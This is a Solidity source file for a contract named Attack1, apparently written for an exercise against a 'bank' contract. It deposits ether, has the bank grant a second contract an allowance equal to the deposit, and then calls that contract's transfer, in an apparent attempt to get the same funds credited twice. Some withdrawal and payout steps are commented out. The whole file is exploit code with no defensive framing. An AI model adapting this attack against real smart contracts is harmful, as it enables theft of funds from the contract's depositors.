//SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.15;

contract Attack1{
    address bank;
    address payable attacker_account;
    address contract2;
    uint256 attack_value;

    constructor(address attackee, address second_contract){
        bank = attackee;
        contract2 = second_contract;
    }

    function sendEther(uint256 amt, address sender) public payable {
        (bool success, ) = bank.call{value: amt}("");

        require(success, "deposit did not go through");

        attacker_account = payable(sender);
        attack_value = amt;
    }

    function addAllowance() public {
        (bool success, ) = bank.call(
            abi.encodeWithSignature("addAllowance(address,uint256)", contract2, attack_value)
        );

        require(success, "allowance did not go through");
    }

    function receiveEther() public {
        (bool success, ) = bank.call(
            abi.encodeWithSignature("withdrawBalance()")
        );

        /*(bool success2, ) = contract2.call(
            abi.encodeWithSignature("transfer(address,uint256)", address(this), attack_value)
        );*/

        require(success, "withdraw did not go through");
        //require(success2, "transfer did not go through");
    }

    receive() external payable{
        //attacker_account.transfer(msg.value);
    }

    function call_contract2() public {
        (bool success, ) = contract2.call(
            abi.encodeWithSignature("transfer(address,uint256)", address(this), attack_value)
        );

        require(success, "calling the second contract did not go through");
    }

    function attack1() public payable {
        sendEther(msg.value, msg.sender);
        addAllowance();
        //receiveEther();
        call_contract2();
    }
}